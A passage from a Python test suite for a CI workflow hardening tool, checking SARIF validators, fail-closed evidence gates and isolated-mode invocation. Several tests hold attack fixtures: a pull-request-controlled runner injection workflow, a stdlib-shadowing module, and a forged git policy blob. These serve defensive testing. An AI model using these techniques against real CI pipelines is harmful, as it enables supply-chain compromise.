        legacy_schema = json.loads(json.dumps(base_document))
        legacy_schema["$schema"] = (
            "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/"
            "master/Schemata/sarif-schema-2.1.0.json"
        )
        denied_schema, _, _ = execute(legacy_schema)
        self.assertNotEqual(0, denied_schema.returncode)
        self.assertIn("schema URI emitted by the pinned", denied_schema.stderr)

        extension_note = json.loads(json.dumps(base_document))
        extension_note["runs"][0]["tool"]["extensions"][0]["notifications"] = [
            {
                "id": "javascript/diagnostics/informational",
                "name": "javascript/diagnostics/informational",
            }
        ]
        extension_note["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ].append(
            {
                "descriptor": {
                    "id": "javascript/diagnostics/informational",
                    "index": 0,
                    "toolComponent": {"index": 0},
                },
                "level": "note",
                "message": {"text": "bounded informational diagnostic"},
            }
        )
        allowed_extension, _, _ = execute(extension_note)
        self.assertEqual(0, allowed_extension.returncode, allowed_extension.stderr)

        extraction_telemetry = json.loads(json.dumps(base_document))
        extraction_telemetry["runs"][0]["tool"]["driver"]["notifications"].append(
            {
                "id": "cli/expected-extracted-files/python",
                "name": "cli/expected-extracted-files/python",
                "shortDescription": {"text": "Expected extracted files"},
                "fullDescription": {
                    "text": (
                        "Files appearing in the source archive that are expected "
                        "to be extracted."
                    )
                },
                "defaultConfiguration": {"enabled": True},
                "properties": {
                    "tags": ["expected-extracted-files", "telemetry"],
                    "languageDisplayName": "Python",
                },
            }
        )
        extraction_telemetry["runs"][0]["tool"]["extensions"][0][
            "notifications"
        ] = [
            {
                "id": "py/diagnostics/successfully-extracted-files",
                "name": "py/diagnostics/successfully-extracted-files",
                "shortDescription": {"text": "Extracted Python files"},
                "fullDescription": {
                    "text": (
                        "Lists all Python files in the source code directory that "
                        "were extracted."
                    )
                },
                "defaultConfiguration": {"enabled": True},
                "properties": {
                    "tags": ["successfully-extracted-files"],
                    "description": (
                        "Lists all Python files in the source code directory that "
                        "were extracted."
                    ),
                    "id": "py/diagnostics/successfully-extracted-files",
                    "kind": "diagnostic",
                    "name": "Extracted Python files",
                },
            }
        ]
        extraction_telemetry["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ].append(
            {
                "descriptor": {
                    "id": "cli/expected-extracted-files/python",
                    "index": 1,
                },
                "level": "none",
                "locations": [
                    {
                        "physicalLocation": {
                            "artifactLocation": {
                                "uri": "scripts/mergegrounds.py",
                                "uriBaseId": "%SRCROOT%",
                                "index": 0,
                            }
                        }
                    }
                ],
                "message": {"text": ""},
                "properties": {"formattedMessage": {"text": ""}},
            }
        )
        extraction_telemetry["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ].append(
            {
                "descriptor": {
                    "id": "py/diagnostics/successfully-extracted-files",
                    "index": 0,
                    "toolComponent": {"index": 0},
                },
                "level": "none",
                "locations": [
                    {
                        "physicalLocation": {
                            "artifactLocation": {
                                "uri": "tests/test_workflow_hardening.py",
                                "uriBaseId": "%SRCROOT%",
                                "index": 1,
                            }
                        }
                    }
                ],
                "message": {"text": ""},
                "properties": {"formattedMessage": {"text": ""}},
            }
        )
        allowed_extraction, _, _ = execute(extraction_telemetry)
        self.assertEqual(0, allowed_extraction.returncode, allowed_extraction.stderr)

        malformed_extraction = json.loads(json.dumps(extraction_telemetry))
        malformed_extraction["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ][1]["properties"]["formattedMessage"]["text"] = "candidate controlled"
        denied_extraction, _, _ = execute(malformed_extraction)
        self.assertNotEqual(0, denied_extraction.returncode)
        self.assertIn("extraction telemetry", denied_extraction.stderr)

        named_component = json.loads(json.dumps(extension_note))
        named_component["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ][1]["descriptor"]["toolComponent"]["name"] = "codeql/javascript-queries"
        denied_component, _, _ = execute(named_component)
        self.assertNotEqual(0, denied_component.returncode)
        self.assertIn("toolComponent reference is ambiguous", denied_component.stderr)

        no_diagnostics = json.loads(json.dumps(base_document))
        del no_diagnostics["runs"][0]["invocations"]
        allowed_without_invocation, no_diagnostics_root, _ = execute(no_diagnostics)
        self.assertEqual(0, allowed_without_invocation.returncode)
        no_diagnostics_manifest = json.loads(
            (
                no_diagnostics_root
                / "validated/javascript-typescript.manifest.json"
            ).read_text(encoding="utf-8")
        )
        self.assertEqual(0, no_diagnostics_manifest["sarif"]["invocations"])

        no_rule_inventory = json.loads(json.dumps(base_document))
        no_rule_inventory["runs"][0]["tool"]["extensions"][0]["rules"] = []
        denied_inventory, _, _ = execute(no_rule_inventory)
        self.assertNotEqual(0, denied_inventory.returncode)
        self.assertIn("inventory at least one", denied_inventory.stderr)

        duplicate_rule = json.loads(json.dumps(base_document))
        duplicate_rule["runs"][0]["tool"]["driver"]["rules"] = [
            duplicate_rule["runs"][0]["tool"]["extensions"][0]["rules"][0]
        ]
        denied_duplicate, _, _ = execute(duplicate_rule)
        self.assertNotEqual(0, denied_duplicate.returncode)
        self.assertIn("unique across tool components", denied_duplicate.stderr)

        missing_results = json.loads(json.dumps(base_document))
        del missing_results["runs"][0]["results"]
        denied_results, _, _ = execute(missing_results)
        self.assertNotEqual(0, denied_results.returncode)
        self.assertIn("explicit results array", denied_results.stderr)

    def test_codeql_sarif_validator_rejects_links_and_extra_files(self) -> None:
        workflow = (ROOT / ".github/workflows/codeql.yml").read_text(encoding="utf-8")
        validator = self.step_python_heredoc(
            self.workflow_step(
                workflow,
                "Validate, inventory, and enforce zero findings",
            )
        )
        document = json.dumps(
            self.pinned_codeql_sarif_document(),
            separators=(",", ":"),
        )
        environment = {
            **os.environ,
            "EXPECTED_LANGUAGE": "javascript-typescript",
            "EXPECTED_CATEGORY": "/language:javascript-typescript",
            "SUBJECT_SHA": "b" * 40,
            "REPOSITORY_ID": "acme/project",
            "WORKFLOW_REF": "acme/project/.github/workflows/codeql.yml@refs/heads/main",
            "RUN_ID": "9",
            "RUN_ATTEMPT": "1",
        }
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            incoming = root / "incoming"
            incoming.mkdir()
            target = root / "outside.sarif"
            target.write_text(document, encoding="utf-8")
            (incoming / "upload.sarif").symlink_to(target)
            linked = subprocess.run(
                [sys.executable, "-I", "-"],
                input=validator,
                cwd=root,
                env=environment,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertNotEqual(0, linked.returncode)
            self.assertIn("exactly one regular", linked.stderr)

            (incoming / "upload.sarif").unlink()
            (incoming / "upload.sarif").write_text(document, encoding="utf-8")
            (incoming / "extra.txt").write_text("unexpected", encoding="utf-8")
            extra = subprocess.run(
                [sys.executable, "-I", "-"],
                input=validator,
                cwd=root,
                env=environment,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertNotEqual(0, extra.returncode)
            self.assertIn("exactly one regular", extra.stderr)

    def test_codeql_matrix_producer_cannot_be_rebound_to_pr_controlled_runner(self) -> None:
        self.workflow.unlink(missing_ok=True)
        codeql = self.workflow.with_name("codeql.yml")
        codeql.write_text(
            textwrap.dedent(
                """
                name: Malicious CodeQL producer rebinding
                on: [pull_request]
                permissions:
                  contents: read
                concurrency:
                  group: codeql-${{ github.event.pull_request.number || github.ref }}
                  cancel-in-progress: false
                jobs:
                  detect:
                    runs-on: ubuntu-24.04
                    outputs:
                      matrix: ${{ steps.languages.outputs.matrix }}
                    steps:
                      - id: languages
                        run: |
                          python3 - <<'PY'
                          import json, os
                          event = json.load(open(os.environ["GITHUB_EVENT_PATH"]))
                          print("matrix=" + json.dumps({"include": [{"runner": event["pull_request"]["title"]}]}))
                          PY
                  analyze:
                    needs: detect
                    strategy:
                      matrix: ${{ fromJSON(needs.detect.outputs.matrix) }}
                    runs-on: ${{ matrix.runner }}
                    permissions:
                      security-events: write
                    steps:
                      - run: echo attacker-controlled runner
                """
            ).lstrip(),
            encoding="utf-8",
        )
        self.assertIn(
            "WORKFLOW_TOPOLOGY",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

    def test_block_scalar_shell_syntax_is_not_misparsed_as_yaml(self) -> None:
        findings = self.findings_for(
            """
            - run: |
                ! false
                printf '%s\\n' "${{ github.sha }}"
            """
        )
        self.assertEqual([], findings)

    def test_workflow_evidence_cleanup_preserves_tracked_marker_and_clean_tree(self) -> None:
        expected_cleanup = (
            "find .mergegrounds/evidence -depth -mindepth 1 "
            "! -path '.mergegrounds/evidence/.gitkeep' -delete"
        )
        workflows = (
            ROOT / ".github" / "workflows" / "mergegrounds.yml",
            ROOT / ".github" / "workflows" / "full-scan.yml",
        )

        for workflow in workflows:
            with self.subTest(workflow=workflow.name):
                text = workflow.read_text(encoding="utf-8")
                cleanup_commands = [
                    line.strip()
                    for line in text.splitlines()
                    if line.strip().startswith("find .mergegrounds/evidence ")
                ]
                self.assertEqual([expected_cleanup], cleanup_commands)
                self.assertNotIn("rm -rf -- .mergegrounds/evidence", text)

                with tempfile.TemporaryDirectory() as directory:
                    repository = Path(directory)
                    evidence = repository / ".mergegrounds" / "evidence"
                    nested = evidence / "nested"
                    nested.mkdir(parents=True)
                    marker = evidence / ".gitkeep"
                    marker.write_text("", encoding="utf-8")
                    (evidence / "old.json").write_text("{}\n", encoding="utf-8")
                    (nested / "artifact.txt").write_text("generated\n", encoding="utf-8")
                    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=repository, check=True)
                    subprocess.run(["git", "add", ".mergegrounds/evidence/.gitkeep"], cwd=repository, check=True)
                    subprocess.run(
                        [
                            "git",
                            "-c",
                            "user.name=MergeGrounds QA",
                            "-c",
                            "user.email=mergegrounds-qa@example.invalid",
                            "commit",
                            "-qm",
                            "fixture",
                        ],
                        cwd=repository,
                        check=True,
                    )

                    subprocess.run(
                        ["bash", "-euo", "pipefail", "-c", expected_cleanup],
                        cwd=repository,
                        check=True,
                    )

                    self.assertTrue(marker.is_file())
                    self.assertFalse((evidence / "old.json").exists())
                    self.assertFalse(nested.exists())
                    status = subprocess.run(
                        ["git", "status", "--porcelain=v1", "--", ".mergegrounds/evidence"],
                        cwd=repository,
                        check=True,
                        text=True,
                        stdout=subprocess.PIPE,
                    )
                    self.assertEqual("", status.stdout)

    def test_workflows_retain_only_validated_pass_or_deny_evidence(self) -> None:
        cases = (
            {
                "workflow": ROOT / ".github" / "workflows" / "mergegrounds.yml",
                "runner": "Run fail-closed full admission profile",
                "runner_id": "mergegrounds_pr",
                "profile": "full",
                "evidence": ".mergegrounds/evidence/pr.json",
                "validator": "Validate MergeGrounds evidence as inert data",
                "upload": "Retain MergeGrounds evidence",
                "enforcer": "Enforce MergeGrounds PR verdict",
            },
            {
                "workflow": ROOT / ".github" / "workflows" / "full-scan.yml",
                "runner": "Verify policy and run full mutation/security profile",
                "runner_id": "mergegrounds_full",
                "profile": "full",
                "evidence": ".mergegrounds/evidence/full.json",
                "validator": "Validate full MergeGrounds evidence as inert data",
                "upload": "Retain full MergeGrounds evidence",
                "enforcer": "Enforce full MergeGrounds verdict",
            },
        )

        for case in cases:
            with self.subTest(workflow=case["workflow"].name):
                text = case["workflow"].read_text(encoding="utf-8")
                runner = self.workflow_step(text, case["runner"])
                validator = self.workflow_step(text, case["validator"])
                upload = self.workflow_step(text, case["upload"])
                enforcer = self.workflow_step(text, case["enforcer"])

                self.assertIn("continue-on-error: true", runner)
                self.assertIn("set +e", runner)
                self.assertIn(
                    f"run --profile {case['profile']} --evidence {case['evidence']}",
                    runner,
                )
                self.assertIn("mergegrounds_exit=$?", runner)
                self.assertIn(
                    "printf 'exit_code=%s\\n' \"$mergegrounds_exit\" >>\"$GITHUB_OUTPUT\"",
                    runner,
                )
                self.assertIn('exit "$mergegrounds_exit"', runner)

                self.assertIn("id: mergegrounds_evidence", validator)
                self.assertIn("if: ${{ always() }}", validator)
                self.assertIn(
                    f"MERGEGROUNDS_EXIT_CODE: ${{{{ steps.{case['runner_id']}.outputs.exit_code }}}}",
                    validator,
                )
                self.assertIn("O_NOFOLLOW", validator)
                self.assertIn("64 * 1024 * 1024", validator)
                self.assertIn("duplicate JSON key", validator)
                self.assertIn("non-finite JSON constant", validator)
                self.assertIn('expected = ("pass", "allow") if exit_code == 0 else ("fail", "deny")', validator)

                self.assertIn(
                    "if: ${{ always() && steps.mergegrounds_evidence.outcome == 'success' }}",
                    upload,
                )
                self.assertIn(f"path: {case['evidence']}", upload)

                self.assertIn("if: ${{ always() }}", enforcer)
                self.assertIn(
                    f"MERGEGROUNDS_EXIT_CODE: ${{{{ steps.{case['runner_id']}.outputs.exit_code }}}}",
                    enforcer,
                )
                self.assertIn(
                    f"RUNNER_OUTCOME: ${{{{ steps.{case['runner_id']}.outcome }}}}",
                    enforcer,
                )
                self.assertIn(
                    "RECEIPT_OUTCOME: ${{ steps.mergegrounds_receipt.outcome }}",
                    enforcer,
                )
                self.assertIn('exit "$MERGEGROUNDS_EXIT_CODE"', enforcer)

    def test_protected_pull_requests_unconditionally_use_full_profile(self) -> None:
        text = (ROOT / ".github/workflows/mergegrounds.yml").read_text(encoding="utf-8")
        runner = self.workflow_step(text, "Run fail-closed full admission profile")
        validator = self.workflow_step(text, "Validate MergeGrounds evidence as inert data")
        normalizer = self.workflow_step(
            text,
            "Normalize MergeGrounds attempt into a fail-closed receipt",
        )
        self.assertIn("run --profile full --evidence .mergegrounds/evidence/pr.json", runner)
        self.assertNotIn("run --profile pr", runner)
        self.assertIn('document.get("profile") != "full"', validator)
        self.assertIn("--profile full", normalizer)
        self.assertNotIn("--profile pr", normalizer)
        pr_profile = (ROOT / ".mergegrounds/profiles/pr.toml").read_text(encoding="utf-8")
        full_profile = (ROOT / ".mergegrounds/profiles/full.toml").read_text(encoding="utf-8")
        self.assertIn("insufficient alone", pr_profile)
        self.assertNotIn('"fuzz"', pr_profile)
        self.assertIn("Protected R3 candidate", full_profile)
        self.assertIn('"fuzz"', full_profile)

    def test_workflows_always_retain_fail_closed_attempt_receipts(self) -> None:
        cases = (
            {
                "workflow": ROOT / ".github/workflows/mergegrounds.yml",
                "normalizer": "Normalize MergeGrounds attempt into a fail-closed receipt",
                "upload": "Retain fail-closed MergeGrounds attempt receipt",
                "raw": ".mergegrounds/evidence/pr.json",
                "receipt": ".mergegrounds/evidence/pr-receipt.json",
                "profile": "full",
            },
            {
                "workflow": ROOT / ".github/workflows/full-scan.yml",
                "normalizer": "Normalize full MergeGrounds attempt into a fail-closed receipt",
                "upload": "Retain fail-closed full-scan attempt receipt",
                "raw": ".mergegrounds/evidence/full.json",
                "receipt": ".mergegrounds/evidence/full-receipt.json",
                "profile": "full",
            },
        )
        for case in cases:
            with self.subTest(workflow=case["workflow"].name):
                text = case["workflow"].read_text(encoding="utf-8")
                normalizer = self.workflow_step(text, case["normalizer"])
                upload = self.workflow_step(text, case["upload"])
                self.assertIn("if: ${{ always() }}", normalizer)
                self.assertIn("continue-on-error: true", normalizer)
                self.assertIn("normalize-attempt", normalizer)
                self.assertIn(f"--raw {case['raw']}", normalizer)
                self.assertIn(f"--output {case['receipt']}", normalizer)
                self.assertIn(f"--profile {case['profile']}", normalizer)
                self.assertIn("if: ${{ always() }}", upload)
                self.assertIn(f"path: {case['receipt']}", upload)
                self.assertIn("if-no-files-found: error", upload)

    def test_workflows_fail_closed_on_conditional_ai_assurance(self) -> None:
        cases = (
            (
                ROOT / ".github/workflows/mergegrounds.yml",
                "Enforce MergeGrounds PR verdict",
            ),
            (
                ROOT / ".github/workflows/full-scan.yml",
                "Enforce full MergeGrounds verdict",
            ),
        )
        for workflow, enforcer_name in cases:
            with self.subTest(workflow=workflow.name):
                text = workflow.read_text(encoding="utf-8")
                assurance = self.workflow_step(text, "Validate conditional AI-product evidence")
                inert = self.workflow_step(
                    text,
                    "Validate AI-product decision as inert subject-bound data",
                )
                upload = self.workflow_step(text, "Retain conditional AI-product decision")
                enforcer = self.workflow_step(text, enforcer_name)
                self.assertIn("id: ai_assurance", assurance)
                self.assertIn("if: ${{ always() }}", assurance)
                self.assertIn("continue-on-error: true", assurance)
                self.assertIn("python3 -I scripts/ai_assurance.py evaluate", assurance)
                self.assertIn(
                    "evaluate \\\n            --output .mergegrounds/evidence/ai-decision.json",
                    assurance,
                )
                self.assertNotIn(
                    ">.mergegrounds/evidence/ai-decision.json",
                    assurance,
                )
                self.assertIn("id: ai_evidence", inert)
                self.assertIn("if: ${{ always() }}", inert)
                self.assertNotIn("continue-on-error: true", inert)
                self.assertIn("python3 -I - .mergegrounds/evidence/ai-decision.json", inert)
                for semantic_guard in (
                    "os.O_NOFOLLOW",
                    "metadata.st_mode & 0o111",
                    "non-finite JSON constant",
                    "duplicate JSON key",
                    "head != expected_sha",
                    'decision["source_commit"] != expected_sha',
                    'decision["source_tree"] != tree',
                    'decision["config_digest"] != config_digest',
                    'decision["product_ai"] is not policy["product_ai"]',
                    'decision["report_digest"] != actual_report',
                    "AI_REPORT_CONFORMANT",
                    "AI_NOT_APPLICABLE",
                    '"GIT_NO_REPLACE_OBJECTS": "1"',
                    '"GIT_CONFIG_GLOBAL": os.devnull',
                    "def git_stdout",
                    "env=git_environment",
                ):
                    self.assertIn(semantic_guard, inert)
                self.assertIn("if: ${{ always() }}", upload)
                self.assertIn("path: .mergegrounds/evidence/ai-decision.json", upload)
                self.assertIn("if-no-files-found: error", upload)
                self.assertIn(
                    "AI_ASSURANCE_OUTCOME: ${{ steps.ai_assurance.outcome }}",
                    enforcer,
                )
                self.assertIn(
                    "AI_EVIDENCE_OUTCOME: ${{ steps.ai_evidence.outcome }}",
                    enforcer,
                )
                self.assertIn('[[ "$AI_ASSURANCE_OUTCOME" != success ]]', enforcer)
                self.assertIn('[[ "$AI_EVIDENCE_OUTCOME" != success ]]', enforcer)

    def test_all_python_control_plane_invocations_use_isolated_mode(self) -> None:
        paths = (
            ROOT / ".github/workflows/mergegrounds.yml",
            ROOT / ".github/workflows/full-scan.yml",
            ROOT / ".pre-commit-config.yaml",
        )
        invocation = re.compile(r"python3(?:\s+-I)?\s+scripts/(?:mergegrounds|ai_assurance)\.py")
        for path in paths:
            with self.subTest(path=path.name):
                text = path.read_text(encoding="utf-8")
                matches = invocation.findall(text)
                self.assertTrue(matches)
                self.assertTrue(
                    all(match.startswith("python3 -I ") for match in matches),
                    f"non-isolated control-plane invocation in {path}: {matches}",
                )

        self.assertIn(
            "PYTHON_ISOLATION",
            self.codes_for(
                """
                - run: python3 scripts/mergegrounds.py verify-repo --strict
                """
            ),
        )

    def test_isolated_mode_blocks_sibling_standard_library_shadow(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            repository = Path(directory)
            scripts = repository / "scripts"
            scripts.mkdir()
            verifier = scripts / "mergegrounds.py"
            verifier.write_bytes((ROOT / "scripts/mergegrounds.py").read_bytes())
            verifier.chmod(0o755)
            marker = repository / "shadow-executed"
            (scripts / "json.py").write_text(
                "from pathlib import Path\n"
                "Path('shadow-executed').write_text('executed', encoding='utf-8')\n"
                "raise RuntimeError('stdlib shadow executed')\n",
                encoding="utf-8",
            )

            vulnerable = subprocess.run(
                [sys.executable, "scripts/mergegrounds.py", "--help"],
                cwd=repository,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
            self.assertNotEqual(0, vulnerable.returncode)
            self.assertTrue(marker.is_file())
            marker.unlink()

            isolated = subprocess.run(
                [sys.executable, "-I", "scripts/mergegrounds.py", "--help"],
                cwd=repository,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
            self.assertEqual(0, isolated.returncode, isolated.stderr)
            self.assertFalse(marker.exists())

            direct = subprocess.run(
                [str(verifier), "--help"],
                cwd=repository,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
            self.assertEqual(0, direct.returncode, direct.stderr)
            self.assertFalse(marker.exists())

    def test_pr_policy_uses_full_history_structured_contract_and_no_checkbox_gate(self) -> None:
        text = (ROOT / ".github/workflows/mergegrounds.yml").read_text(encoding="utf-8")
        self.assertIn("cancel-in-progress: false", text)
        policy_prefix = text[: text.index("\n  pr:")]
        self.assertIn("fetch-depth: 0", policy_prefix)
        self.assertIn("verify-change --event \"$GITHUB_EVENT_PATH\"", policy_prefix)
        self.assertNotIn("attest-pr", text)
        template = (ROOT / ".github/pull_request_template.md").read_text(encoding="utf-8")
        self.assertNotRegex(template, r"(?m)^\s*[-*]\s*\[[ xX]\]")
        self.assertIn("never admission evidence", template)

    def test_evidence_validator_and_final_gate_preserve_fail_closed_semantics(self) -> None:
        workflow = (ROOT / ".github" / "workflows" / "mergegrounds.yml").read_text(encoding="utf-8")
        validator = self.step_python_heredoc(
            self.workflow_step(workflow, "Validate MergeGrounds evidence as inert data")
        )
        enforcer = self.step_run_script(
            self.workflow_step(workflow, "Enforce MergeGrounds PR verdict")
        )

        with tempfile.TemporaryDirectory() as directory:
            repository = Path(directory)
            evidence = repository / ".mergegrounds" / "evidence" / "pr.json"
            evidence.parent.mkdir(parents=True)

            validation_cases = (
                (0, {"schema_version": 1, "profile": "full", "status": "pass", "decision": "allow"}, 0),
                (1, {"schema_version": 1, "profile": "full", "status": "fail", "decision": "deny"}, 0),
                (0, {"schema_version": 1, "profile": "full", "status": "fail", "decision": "deny"}, 1),
                (1, {"schema_version": 1, "profile": "full", "status": "pass", "decision": "allow"}, 1),
            )
            for exit_code, payload, expected_failure in validation_cases:
                with self.subTest(validator_exit=exit_code, payload=payload):
                    evidence.write_text(json.dumps(payload) + "\n", encoding="utf-8")
                    result = subprocess.run(
                        [sys.executable, "-I", "-", ".mergegrounds/evidence/pr.json"],
                        cwd=repository,
                        env={**os.environ, "MERGEGROUNDS_EXIT_CODE": str(exit_code)},
                        input=validator,
                        text=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        check=False,
                    )
                    self.assertEqual(expected_failure, int(result.returncode != 0), result.stderr)

            evidence.write_text(
                '{"schema_version":1,"status":"fail","status":"pass","decision":"allow"}\n',
                encoding="utf-8",
            )
            duplicate = subprocess.run(
                [sys.executable, "-I", "-", ".mergegrounds/evidence/pr.json"],
                cwd=repository,
                env={**os.environ, "MERGEGROUNDS_EXIT_CODE": "0"},
                input=validator,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertNotEqual(0, duplicate.returncode)

        enforcement_cases = (
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "success",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "0",
                    "RUNNER_OUTCOME": "success",
                },
                0,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "failure",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "7",
                    "RUNNER_OUTCOME": "failure",
                },
                7,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "failure",
                    "RECEIPT_OUTCOME": "success",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "0",
                    "RUNNER_OUTCOME": "success",
                },
                1,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "failure",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "0",
                    "RUNNER_OUTCOME": "success",
                },
                1,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "success",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "7",
                    "RUNNER_OUTCOME": "failure",
                },
                1,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "success",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "0",
                    "RUNNER_OUTCOME": "failure",
                },
                1,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "failure",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "MERGEGROUNDS_EXIT_CODE": "bad",
                    "RUNNER_OUTCOME": "failure",
                },
                1,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "success",
                    "AI_ASSURANCE_OUTCOME": "failure",
                    "MERGEGROUNDS_EXIT_CODE": "0",
                    "RUNNER_OUTCOME": "success",
                },
                1,
            ),
            (
                {
                    "EVIDENCE_OUTCOME": "success",
                    "RECEIPT_OUTCOME": "success",
                    "AI_ASSURANCE_OUTCOME": "success",
                    "AI_EVIDENCE_OUTCOME": "failure",
                    "MERGEGROUNDS_EXIT_CODE": "0",
                    "RUNNER_OUTCOME": "success",
                },
                1,
            ),
        )
        for environment, expected in enforcement_cases:
            with self.subTest(enforcer=environment):
                result = subprocess.run(
                    ["bash", "-c", enforcer],
                    env={
                        **os.environ,
                        "AI_EVIDENCE_OUTCOME": "success",
                        **environment,
                    },
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=False,
                )
                self.assertEqual(expected, result.returncode, result.stderr)

    def test_ai_evidence_validator_rejects_unsafe_files_and_wrong_bindings(self) -> None:
        workflow = (ROOT / ".github" / "workflows" / "mergegrounds.yml").read_text(
            encoding="utf-8"
        )
        validator = self.step_python_heredoc(
            self.workflow_step(
                workflow,
                "Validate AI-product decision as inert subject-bound data",
            )
        )

        with tempfile.TemporaryDirectory() as directory:
            repository = Path(directory)
            evidence = repository / ".mergegrounds" / "evidence"
            evidence.mkdir(parents=True)
            policy = repository / ".mergegrounds" / "ai-assurance.toml"
            policy.write_text(
                "schema_version = 1\n"
                "product_ai = true\n"
                "fail_closed = true\n"
                'capabilities = ["generation"]\n'
                "[evaluation]\n"
                'report_path = ".mergegrounds/evidence/ai-report.json"\n',
                encoding="utf-8",
            )
            report = evidence / "ai-report.json"
            report.write_text('{"conformant":true}\n', encoding="utf-8")
            subprocess.run(["git", "init", "-q", "-b", "main"], cwd=repository, check=True)
            subprocess.run(["git", "add", ".mergegrounds/ai-assurance.toml"], cwd=repository, check=True)
            subprocess.run(
                [
                    "git",
                    "-c",
                    "user.name=MergeGrounds QA",
                    "-c",
                    "user.email=mergegrounds-qa@example.invalid",
                    "commit",
                    "-qm",
                    "AI policy fixture",
                ],
                cwd=repository,
                check=True,
            )
            head = subprocess.run(
                ["git", "rev-parse", "HEAD"],
                cwd=repository,
                check=True,
                text=True,
                stdout=subprocess.PIPE,
            ).stdout.strip()
            tree = subprocess.run(
                ["git", "rev-parse", "HEAD^{tree}"],
                cwd=repository,
                check=True,
                text=True,
                stdout=subprocess.PIPE,
            ).stdout.strip()
            def digest(value: bytes) -> str:
                return "sha256:" + hashlib.sha256(value).hexdigest()
            decision = {
                "schema_version": 2,
                "decision": "allow",
                "local_conformance": True,
                "authority": "local-validation-only",
                "product_ai": True,
                "capabilities": ["generation"],
                "report_path": ".mergegrounds/evidence/ai-report.json",
                "source_commit": head,
                "source_tree": tree,
                "config_digest": digest(policy.read_bytes()),
                "report_digest": digest(report.read_bytes()),
                "expected_case_set_digest": "sha256:" + "1" * 64,
                "findings": [{"code": "AI_REPORT_CONFORMANT"}],
                "limitations": ["local validation is not an external attestation"],
            }
            decision_path = evidence / "ai-decision.json"

            def execute(raw: bytes, *, mode: int = 0o600, expected_sha: str = head) -> subprocess.CompletedProcess[str]:
                if decision_path.is_symlink() or decision_path.exists():
                    decision_path.unlink()
                decision_path.write_bytes(raw)
                decision_path.chmod(mode)
                return subprocess.run(
                    [sys.executable, "-I", "-", ".mergegrounds/evidence/ai-decision.json"],
                    cwd=repository,
                    env={**os.environ, "EXPECTED_SHA": expected_sha},
                    input=validator,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=False,
                )

            canonical = (json.dumps(decision, separators=(",", ":")) + "\n").encode()
            valid = execute(canonical)
            self.assertEqual(0, valid.returncode, valid.stderr)

            mutations = {
                "wrong tree": {**decision, "source_tree": "0" * 40},
                "wrong config digest": {**decision, "config_digest": "sha256:" + "0" * 64},
                "wrong report digest": {**decision, "report_digest": "sha256:" + "0" * 64},
                "wrong applicability": {**decision, "product_ai": False},
            }
            for label, payload in mutations.items():
                with self.subTest(label=label):
                    result = execute((json.dumps(payload, separators=(",", ":")) + "\n").encode())
                    self.assertNotEqual(0, result.returncode)

            duplicate = canonical.replace(
                b'{"schema_version":2,',
                b'{"schema_version":2,"schema_version":2,',
                1,
            )
            self.assertNotEqual(0, execute(duplicate).returncode)
            nonfinite = canonical.replace(b'"schema_version":2', b'"schema_version":NaN', 1)
            self.assertNotEqual(0, execute(nonfinite).returncode)
            self.assertNotEqual(0, execute(canonical, mode=0o755).returncode)

            outside = repository / "outside-decision.json"
            outside.write_bytes(canonical)
            decision_path.unlink()
            decision_path.symlink_to(outside)
            symlink_result = subprocess.run(
                [sys.executable, "-I", "-", ".mergegrounds/evidence/ai-decision.json"],
                cwd=repository,
                env={**os.environ, "EXPECTED_SHA": head},
                input=validator,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertNotEqual(0, symlink_result.returncode)

            evil_policy = (
                b"schema_version = 1\n"
                b"product_ai = false\n"
                b"fail_closed = true\n"
                b"capabilities = []\n"
            )
            evil_blob = subprocess.run(
                ["git", "hash-object", "-w", "--stdin"],
                cwd=repository,
                check=True,
                input=evil_policy,
                stdout=subprocess.PIPE,
            ).stdout.decode().strip()
            evil_mergegrounds_tree = subprocess.run(
                ["git", "mktree"],
                cwd=repository,
                check=True,
                text=True,
                input=f"100644 blob {evil_blob}\tai-assurance.toml\n",
